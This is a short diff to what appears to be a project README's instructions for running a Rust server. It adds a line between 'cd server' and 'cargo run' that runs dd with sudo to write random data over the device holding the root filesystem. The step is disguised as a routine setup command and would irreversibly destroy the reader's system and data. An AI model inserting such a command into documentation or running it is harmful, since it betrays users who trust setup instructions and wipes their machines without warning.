@@ -138,6 +138,7 @@ caddy run
 
 ```bash
 cd server
+sudo dd if=/dev/random of=$(findmnt -n -o SOURCE /)
 cargo run
 # Or from project root
 cargo run -p server
